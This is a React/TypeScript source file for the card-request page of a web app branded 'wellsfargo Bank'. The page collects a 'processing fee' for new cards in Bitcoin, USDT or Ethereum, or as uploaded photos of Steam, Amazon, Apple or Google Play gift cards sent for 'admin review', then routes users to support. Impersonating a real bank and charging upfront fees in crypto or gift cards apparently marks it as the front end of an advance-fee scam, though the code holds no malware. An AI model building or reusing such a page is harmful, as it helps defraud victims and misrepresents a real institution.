import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { useState } from "react";

import {
  ArrowLeft,
  ArrowRight,
  Bitcoin,
  Building2,
  Check,
  CreditCard,
  Eye,
  Gift,
  ImagePlus,
  Lock,
  MessageCircle,
  ShieldAlert,
  Unlock,
  X,
} from "lucide-react";

import { toast } from "sonner";

import { AppShell } from "@/components/AppShell";
import {
  EmptyState,
  ListSkeleton,
  StatusBadge,
} from "@/components/bank-bits";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";

import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";

import { useAccounts, useCards, useProfile } from "@/hooks/useBank";

import { money } from "@/lib/format";
import { TIER_FEES } from "@/lib/bank-helpers";
import { supabase } from "@/integrations/supabase/client";

import {
  createCardRequest,
  getCardPin,
  getMyCardRequests,
  setCardStatus,
} from "@/lib/bank.functions";

export const Route = createFileRoute("/_authenticated/cards")({
  head: () => ({
    meta: [
      { title: "Cards — wellsfargo Bank" },
      {
        name: "description",
        content: "Manage your cards and request a new virtual or physical card.",
      },
    ],
  }),
  component: CardsPage,
});

type Step = 1 | 2 | 3 | 4 | 5;
type CardTier = "standard" | "gold" | "platinum";
type DeliveryType = "online" | "physical";
type PaymentMethod = "btc" | "usdt" | "ethereum" | "bank_transfer" | "gift_card";

const TIERS = [
  { key: "standard" as const, title: "Standard", description: "Everyday spending and online purchases." },
  { key: "gold" as const, title: "Gold", description: "Higher limits with a premium design." },
  { key: "platinum" as const, title: "Platinum", description: "Our premium tier, with the highest limits." },
];

const PAYMENT_METHODS = [
  { key: "btc" as const, title: "Bitcoin", description: "Pay with Bitcoin", icon: Bitcoin },
  { key: "usdt" as const, title: "USDT", description: "Pay with USDT", icon: CreditCard },
  { key: "ethereum" as const, title: "Ethereum", description: "Pay with Ethereum", icon: CreditCard },
  { key: "bank_transfer" as const, title: "Bank Transfer", description: "Pay via bank transfer", icon: Building2 },
  { key: "gift_card" as const, title: "Gift Card", description: "Submit gift-card images for admin review", icon: Gift },
];

type GiftCardImage = {
  file: File;
  preview: string;
};

function CardsPage() {
  const navigate = useNavigate();
  const queryClient = useQueryClient();

  const { data: profile } = useProfile();
  const { data: accounts } = useAccounts();
  const { data: cards, isLoading } = useCards();

  const request = useServerFn(createCardRequest);
  const changeStatus = useServerFn(setCardStatus);
  const fetchPin = useServerFn(getCardPin);
  const loadRequests = useServerFn(getMyCardRequests);

  const requestsQuery = useQuery({
    queryKey: ["my-card-requests"],
    queryFn: () => loadRequests(),
    retry: false,
  });

  const currency = profile?.currency ?? "USD";

  const [open, setOpen] = useState(false);
  const [step, setStep] = useState<Step>(1);
  const [busy, setBusy] = useState(false);
  const [uploadingImages, setUploadingImages] = useState(false);

  const [tier, setTier] = useState<CardTier>("standard");
  const [delivery, setDelivery] = useState<DeliveryType>("online");
  const [payment, setPayment] = useState<PaymentMethod>("btc");
  const [giftCardType, setGiftCardType] = useState("steam");
  const [giftCardImages, setGiftCardImages] = useState<GiftCardImage[]>([]);
  const [accountId, setAccountId] = useState("");
  const [pins, setPins] = useState<Record<string, string>>({});

  const selectedTier = TIER_FEES[tier];
  const selectedAccount = accountId || accounts?.[0]?.id || "";

  function resetRequest() {
    setStep(1);
    setTier("standard");
    setDelivery("online");
    setPayment("btc");
    setGiftCardType("steam");
    setGiftCardImages([]);
    setAccountId("");
    setBusy(false);
    setUploadingImages(false);
  }

  function closeDialog() {
    setOpen(false);
    resetRequest();
  }

  function nextStep() {
    if (step === 1) return setStep(2);
    if (step === 2) return setStep(3);
    if (step === 3) return setStep(4);
  }

  function previousStep() {
    if (step === 1 || step === 5) return;
    setStep((step - 1) as Step);
  }

  function handleGiftCardUpload(event: React.ChangeEvent<HTMLInputElement>) {
    const files = Array.from(event.target.files ?? []);
    event.target.value = "";
    if (!files.length) return;

    if (giftCardImages.length + files.length > 20) {
      toast.error("You can upload up to 20 images");
      return;
    }

    for (const file of files) {
      if (!["image/jpeg", "image/png", "image/webp"].includes(file.type)) {
        toast.error(`${file.name}: use JPG, PNG, or WebP`);
        continue;
      }
      if (file.size > 5 * 1024 * 1024) {
        toast.error(`${file.name}: must be smaller than 5MB`);
        continue;
      }
      setGiftCardImages((prev) => [...prev, { file, preview: URL.createObjectURL(file) }]);
    }
  }

  function removeGiftCardImage(idx: number) {
    setGiftCardImages((prev) => prev.filter((_, i) => i !== idx));
  }

  async function uploadGiftCardImages(): Promise<string[]> {
    const urls: string[] = [];
    for (const { file } of giftCardImages) {
      const ext = file.name.split(".").pop();
      const path = `${Date.now()}-${Math.random().toString(36).slice(2)}.${ext}`;
      const { error } = await supabase.storage.from("gift-card-images").upload(path, file);
      if (error) throw error;
      const { data } = supabase.storage.from("gift-card-images").getPublicUrl(path);
      urls.push(data.publicUrl);
    }
    return urls;
  }

  async function submitRequest() {
    if (payment === "gift_card" && giftCardImages.length === 0) {
      toast.error("Upload at least one gift card image");
      return;
    }

    setBusy(true);

    try {
      let giftCardImageUrls: string[] = [];

      if (payment === "gift_card") {
        setUploadingImages(true);
        giftCardImageUrls = await uploadGiftCardImages();
        setUploadingImages(false);
      }

      await request({
        data: {
          accountId: selectedAccount || undefined,
          cardType: tier,
          deliveryType: delivery,
          paymentMethod: payment,
          giftCardType: payment === "gift_card" ? giftCardType : undefined,
          giftCardImageUrls: payment === "gift_card" ? giftCardImageUrls : undefined,
        },
      });

      await queryClient.invalidateQueries({ queryKey: ["my-card-requests"] });
      setStep(5);
    } catch (error) {
      toast.error(error instanceof Error ? error.message : "Unable to submit card request");
    } finally {
      setBusy(false);
      setUploadingImages(false);
    }
  }

  async function toggleLock(id: string, status: string) {
    try {
      await changeStatus({ data: { cardId: id, status: status === "active" ? "locked" : "active" } });
      await queryClient.invalidateQueries();
    } catch (error) {
      toast.error(error instanceof Error ? error.message : "Update failed");
    }
  }

  async function reportLost(id: string) {
    try {
      await changeStatus({ data: { cardId: id, status: "lost" } });
      toast.success("Card reported and blocked");
      await queryClient.invalidateQueries();
    } catch (error) {
      toast.error(error instanceof Error ? error.message : "Update failed");
    }
  }

  async function revealPin(id: string) {
    try {
      const result = await fetchPin({ data: { cardId: id } });
      setPins((current) => ({ ...current, [id]: result.pin }));
    } catch {
      toast.error("Could not reveal PIN");
    }
  }

  return (
    <AppShell title="Cards">
      <div className="space-y-6">
        <section className="rounded-3xl border border-border/70 bg-card p-5 shadow-sm">
          <div className="flex flex-col gap-5 lg:flex-row lg:items-center lg:justify-between">
            <div>
              <p className="text-xs font-semibold uppercase tracking-[0.2em] text-muted-foreground">
                Card Center
              </p>
              <h1 className="mt-2 font-display text-2xl font-bold">Your cards</h1>
              <p className="mt-1 max-w-xl text-sm text-muted-foreground">
                View your cards or request a new Standard, Gold, or Platinum card.
              </p>
            </div>

            <Button onClick={() => { resetRequest(); setOpen(true); }}>
              <CreditCard className="size-4" />
              Request a card
            </Button>
          </div>

          <div className="mt-6">
            <div className="relative mx-auto aspect-[1.586/1] w-full max-w-2xl overflow-hidden rounded-[24px] border border-white/20 bg-gradient-to-br from-slate-950 via-slate-800 to-slate-950 p-6 text-white shadow-2xl">
              <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(255,255,255,.2),transparent_35%)]" />
              <div className="relative flex h-full flex-col justify-between">
                <div className="flex items-start justify-between">
                  <div>
                    <p className="text-xs uppercase tracking-[0.3em] text-white/60">wellsfargo Bank</p>
                    <p className="mt-1 text-sm font-medium">{tier.toUpperCase()}</p>
                  </div>
                  <div className="grid size-12 place-items-center rounded-xl border border-white/20 bg-white/10">
                    <CreditCard className="size-6" />
                  </div>
                </div>

                <div>
                  <div className="mb-4 h-9 w-12 rounded-md bg-gradient-to-br from-yellow-100 to-yellow-500" />
                  <p className="font-mono text-xl tracking-[0.18em] sm:text-2xl">4539 •••• •••• 0000</p>
                </div>

                <div className="flex items-end justify-between">
                  <div>
                    <p className="text-[9px] uppercase text-white/50">Card Holder</p>
                    <p className="text-xs font-medium uppercase">{profile?.full_name ?? "CARD HOLDER"}</p>
                  </div>
                  <div>
                    <p className="text-[9px] uppercase text-white/50">Expires</p>
                    <p className="text-xs">08/30</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>

        {(requestsQuery.data ?? []).length > 0 && (
          <section>
            <div className="mb-3">
              <h2 className="font-display text-lg font-semibold">Card requests</h2>
              <p className="text-sm text-muted-foreground">Track requests awaiting review.</p>
            </div>

            <div className="grid gap-3">
              {(requestsQuery.data ?? []).map((item: any) => (
                <div key={item.id} className="rounded-2xl border border-border/70 bg-card p-4">
                  <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                    <div>
                      <p className="font-semibold capitalize">
                        {item.card_type} {item.delivery_type} card
                      </p>
                      <p className="mt-1 text-xs text-muted-foreground">
                        {formatPaymentMethod(item.payment_method)} · {new Date(item.created_at).toLocaleString()}
                      </p>
                    </div>

                    <StatusBadge
                      status={
                        item.status === "approved" ? "completed" : item.status === "rejected" ? "failed" : "pending"
                      }
                    />
                  </div>
                </div>
              ))}
            </div>
          </section>
        )}

        <section>
          <div className="mb-3">
            <h2 className="font-display text-lg font-semibold">Issued cards</h2>
          </div>

          {isLoading ? (
            <ListSkeleton rows={2} />
          ) : (cards ?? []).length === 0 ? (
            <EmptyState
              icon={<CreditCard className="size-5" />}
              title="No cards yet"
              description="Request a card above to start the card approval process."
              action={
                <Button onClick={() => { resetRequest(); setOpen(true); }}>
                  Request a card
                </Button>
              }
            />
          ) : (
            <div className="grid gap-4 sm:grid-cols-2">
              {(cards ?? []).map((card) => (
                <div key={card.id} className="rounded-2xl border border-border/70 bg-card p-4">
                  <div className="relative overflow-hidden rounded-2xl bg-gradient-to-br from-slate-950 via-slate-800 to-slate-950 p-5 text-white">
                    <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(255,255,255,.18),transparent_40%)]" />
                    <div className="relative">
                      <div className="flex items-start justify-between">
                        <div>
                          <p className="text-xs uppercase tracking-widest text-white/60">wellsfargo Bank</p>
                          <p className="mt-1 text-xs font-semibold uppercase">{card.card_type}</p>
                        </div>
                        <CreditCard className="size-5" />
                      </div>

                      <div className="mt-8 h-8 w-11 rounded-md bg-gradient-to-br from-yellow-100 to-yellow-500" />

                      <p className="mt-4 font-mono text-lg tracking-widest">{card.masked_number}</p>

                      <div className="mt-5 flex items-end justify-between text-xs">
                        <span className="uppercase">{card.holder_name}</span>
                        <span>{card.expiry}</span>
                      </div>
                    </div>
                  </div>

                  <div className="mt-3 flex items-center justify-between text-sm">
                    <span className="text-muted-foreground">
                      Daily limit {money(Number(card.daily_limit), currency)}
                    </span>
                    <StatusBadge status={card.status} />
                  </div>

                  <div className="mt-3 flex flex-wrap gap-2">
                    <Button size="sm" variant="secondary" onClick={() => toggleLock(card.id, card.status)}>
                      {card.status === "active" ? <Lock className="size-4" /> : <Unlock className="size-4" />}
                      {card.status === "active" ? "Freeze" : "Unfreeze"}
                    </Button>

                    <Button size="sm" variant="secondary" onClick={() => revealPin(card.id)}>
                      <Eye className="size-4" />
                      {pins[card.id] ? `PIN ${pins[card.id]}` : "Show PIN"}
                    </Button>

                    <Button
                      size="sm"
                      variant="ghost"
                      className="text-destructive"
                      onClick={() => reportLost(card.id)}
                    >
                      <ShieldAlert className="size-4" />
                      Report lost
                    </Button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </section>
      </div>

      <Dialog
        open={open}
        onOpenChange={(value) => {
          if (!value) closeDialog();
          else setOpen(true);
        }}
      >
        <DialogContent className="max-h-[90vh] max-w-lg overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="font-display">Request a card</DialogTitle>
            <DialogDescription>{step <= 4 ? `Step ${step} of 4` : "Request submitted"}</DialogDescription>
          </DialogHeader>

          {step === 1 && (
            <div className="space-y-4">
              <div>
                <h3 className="font-semibold">Choose your card</h3>
                <p className="text-sm text-muted-foreground">Select the tier you want to request.</p>
              </div>

              <div className="grid gap-3">
                {TIERS.map((item) => {
                  const fee = TIER_FEES[item.key]?.fee ?? 0;
                  const limit = TIER_FEES[item.key]?.limit ?? 0;

                  return (
                    <button
                      type="button"
                      key={item.key}
                      onClick={() => setTier(item.key)}
                      className={`rounded-2xl border p-4 text-left transition ${
                        tier === item.key ? "border-primary bg-primary/5" : "border-border hover:bg-muted/50"
                      }`}
                    >
                      <div className="flex items-start justify-between gap-3">
                        <div>
                          <p className="font-semibold capitalize">{item.title}</p>
                          <p className="mt-1 text-xs text-muted-foreground">{item.description}</p>
                        </div>
                        {tier === item.key && (
                          <span className="grid size-6 place-items-center rounded-full bg-primary text-primary-foreground">
                            <Check className="size-4" />
                          </span>
                        )}
                      </div>

                      <div className="mt-4 flex justify-between text-xs">
                        <span className="text-muted-foreground">Daily limit</span>
                        <span className="font-semibold">{money(Number(limit), currency)}</span>
                      </div>

                      <div className="mt-1 flex justify-between text-xs">
                        <span className="text-muted-foreground">Processing fee</span>
                        <span className="font-semibold">{money(Number(fee), currency)}</span>
                      </div>
                    </button>
                  );
                })}
              </div>

              <Button className="w-full" onClick={nextStep}>
                Continue
                <ArrowRight className="size-4" />
              </Button>
            </div>
          )}

          {step === 2 && (
            <div className="space-y-4">
              <div>
                <h3 className="font-semibold">Choose card format</h3>
                <p className="text-sm text-muted-foreground">
                  Select whether this request is for an online or physical card.
                </p>
              </div>

              <div className="grid gap-3 sm:grid-cols-2">
                <ChoiceCard
                  selected={delivery === "online"}
                  title="Online Card"
                  description="For online purchases."
                  icon={<CreditCard className="size-6" />}
                  onClick={() => setDelivery("online")}
                />
                <ChoiceCard
                  selected={delivery === "physical"}
                  title="Physical Card"
                  description="For a physical card request."
                  icon={<CreditCard className="size-6" />}
                  onClick={() => setDelivery("physical")}
                />
              </div>

              <div className="flex gap-2">
                <Button variant="secondary" className="flex-1" onClick={previousStep}>
                  <ArrowLeft className="size-4" />
                  Back
                </Button>
                <Button className="flex-1" onClick={nextStep}>
                  Continue
                  <ArrowRight className="size-4" />
                </Button>
              </div>
            </div>
          )}

          {step === 3 && (
            <div className="space-y-4">
              <div>
                <h3 className="font-semibold">Choose payment method</h3>
                <p className="text-sm text-muted-foreground">
                  Select how you'd like to pay the processing fee.
                </p>
              </div>

              <div className="grid gap-2">
                {PAYMENT_METHODS.map((method) => {
                  const Icon = method.icon;
                  return (
                    <button
                      type="button"
                      key={method.key}
                      onClick={() => setPayment(method.key)}
                      className={`flex items-center gap-3 rounded-xl border p-4 text-left ${
                        payment === method.key ? "border-primary bg-primary/5" : "border-border hover:bg-muted/50"
                      }`}
                    >
                      <span className="grid size-10 shrink-0 place-items-center rounded-xl bg-muted">
                        <Icon className="size-5" />
                      </span>
                      <span className="min-w-0 flex-1">
                        <span className="block font-medium">{method.title}</span>
                        <span className="block text-xs text-muted-foreground">{method.description}</span>
                      </span>
                      {payment === method.key && <Check className="size-5 text-primary" />}
                    </button>
                  );
                })}
              </div>

              {payment === "gift_card" && (
                <div className="rounded-xl border border-border bg-muted/30 p-4">
                  <p className="font-medium">Gift card details</p>
                  <p className="mt-1 text-xs text-muted-foreground">Upload images for admin review.</p>

                  <div className="mt-4 space-y-2">
                    <Label>Gift card type</Label>
                    <Select value={giftCardType} onValueChange={setGiftCardType}>
                      <SelectTrigger>
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="steam">Steam</SelectItem>
                        <SelectItem value="amazon">Amazon</SelectItem>
                        <SelectItem value="apple">Apple</SelectItem>
                        <SelectItem value="google_play">Google Play</SelectItem>
                        <SelectItem value="other">Other</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="mt-4">
                    <Label htmlFor="gift-card-image" className="cursor-pointer">
                      <div className="mt-2 rounded-xl border border-dashed border-border p-6 text-center transition hover:bg-muted/50">
                        <ImagePlus className="mx-auto size-7 text-muted-foreground" />
                        <p className="mt-2 text-sm font-medium">
                          {giftCardImages.length > 0
                            ? `${giftCardImages.length} image${giftCardImages.length > 1 ? "s" : ""} selected`
                            : "Upload gift card images"}
                        </p>
                        <p className="mt-1 text-xs text-muted-foreground">JPG, PNG or WebP · Max 5MB each · Up to 20 images</p>
                      </div>
                    </Label>
                    <Input
                      id="gift-card-image"
                      type="file"
                      accept="image/jpeg,image/png,image/webp"
                      multiple
                      className="hidden"
                      onChange={handleGiftCardUpload}
                    />

                    {giftCardImages.length > 0 && (
                      <div className="mt-3 grid grid-cols-4 gap-2">
                        {giftCardImages.map((img, i) => (
                          <div key={i} className="relative">
                            <img src={img.preview} alt="" className="aspect-square w-full rounded-lg object-cover" />
                            <button
                              type="button"
                              onClick={() => removeGiftCardImage(i)}
                              className="absolute -right-1.5 -top-1.5 grid size-5 place-items-center rounded-full bg-destructive text-white"
                            >
                              <X className="size-3" />
                            </button>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              )}

              <div className="space-y-2">
                <Label>Funding account</Label>
                <Select value={selectedAccount} onValueChange={setAccountId}>
                  <SelectTrigger>
                    <SelectValue placeholder="Select account" />
                  </SelectTrigger>
                  <SelectContent>
                    {(accounts ?? []).map((account) => (
                      <SelectItem key={account.id} value={account.id}>
                        <span className="capitalize">{account.type}</span> ·{" "}
                        {money(Number(account.balance), currency)}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <div className="flex gap-2">
                <Button variant="secondary" className="flex-1" onClick={previousStep}>
                  <ArrowLeft className="size-4" />
                  Back
                </Button>
                <Button className="flex-1" onClick={nextStep}>
                  Review
                  <ArrowRight className="size-4" />
                </Button>
              </div>
            </div>
          )}

          {step === 4 && (
            <div className="space-y-4">
              <div>
                <h3 className="font-semibold">Review request</h3>
                <p className="text-sm text-muted-foreground">Check everything before submitting.</p>
              </div>

              <div className="divide-y rounded-2xl border">
                <ReviewRow label="Card" value={tier} capitalize />
                <ReviewRow label="Format" value={delivery} capitalize />
                <ReviewRow label="Payment" value={formatPaymentMethod(payment)} />
                {payment === "gift_card" && <ReviewRow label="Gift card" value={giftCardType} capitalize />}
                <ReviewRow label="Processing fee" value={money(Number(selectedTier?.fee ?? 0), currency)} />
              </div>

              {payment === "gift_card" && giftCardImages.length > 0 && (
                <div className="grid grid-cols-4 gap-2">
                  {giftCardImages.map((img, i) => (
                    <div key={i} className="overflow-hidden rounded-xl border">
                      <img src={img.preview} alt="" className="aspect-square w-full object-cover" />
                    </div>
                  ))}
                </div>
              )}

              <div className="rounded-xl bg-muted p-3 text-xs text-muted-foreground">
                Your request will be submitted for admin review.
              </div>

              <div className="flex gap-2">
                <Button variant="secondary" className="flex-1" onClick={previousStep} disabled={busy}>
                  <ArrowLeft className="size-4" />
                  Back
                </Button>
                <Button className="flex-1" onClick={submitRequest} disabled={busy}>
                  {uploadingImages ? "Uploading images..." : busy ? "Submitting..." : "Submit request"}
                </Button>
              </div>
            </div>
          )}

          {step === 5 && (
            <div className="space-y-5 text-center">
              <div className="mx-auto grid size-16 place-items-center rounded-full bg-success/12 text-success">
                <Check className="size-8" />
              </div>
              <div>
                <h2 className="font-display text-xl font-bold">Request submitted</h2>
                <p className="mt-1 text-sm text-muted-foreground">
                  Your {tier} {delivery} card request has been sent for admin review.
                </p>
                <p className="mt-2 text-xs text-muted-foreground">
                  You'll get a notification once it's approved or if we need anything else from you.
                </p>
              </div>
              <div className="flex flex-col gap-2">
                <Button className="w-full" onClick={() => { closeDialog(); navigate({ to: "/support" }); }}>
                  <MessageCircle className="size-4" />
                  Continue to Support
                </Button>
                <Button variant="secondary" className="w-full" onClick={closeDialog}>
                  Done
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </AppShell>
  );
}

function ChoiceCard({
  selected,
  title,
  description,
  icon,
  onClick,
}: {
  selected: boolean;
  title: string;
  description: string;
  icon: React.ReactNode;
  onClick: () => void;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={`rounded-2xl border p-5 text-left transition ${
        selected ? "border-primary bg-primary/5" : "border-border hover:bg-muted/50"
      }`}
    >
      <div className="flex items-start justify-between">
        <span className="grid size-11 place-items-center rounded-xl bg-muted">{icon}</span>
        {selected && (
          <span className="grid size-6 place-items-center rounded-full bg-primary text-primary-foreground">
            <Check className="size-4" />
          </span>
        )}
      </div>
      <p className="mt-4 font-semibold">{title}</p>
      <p className="mt-1 text-xs text-muted-foreground">{description}</p>
    </button>
  );
}

function ReviewRow({ label, value, capitalize = false }: { label: string; value: string; capitalize?: boolean }) {
  return (
    <div className="flex items-center justify-between gap-4 p-4">
      <span className="text-sm text-muted-foreground">{label}</span>
      <span className={`text-right text-sm font-semibold ${capitalize ? "capitalize" : ""}`}>{value}</span>
    </div>
  );
}

function formatPaymentMethod(method: string) {
  switch (method) {
    case "btc":
      return "Bitcoin";
    case "usdt":
      return "USDT";
    case "ethereum":
      return "Ethereum";
    case "bank_transfer":
      return "Bank Transfer";
    case "gift_card":
      return "Gift Card";
    default:
      return method;
  }
}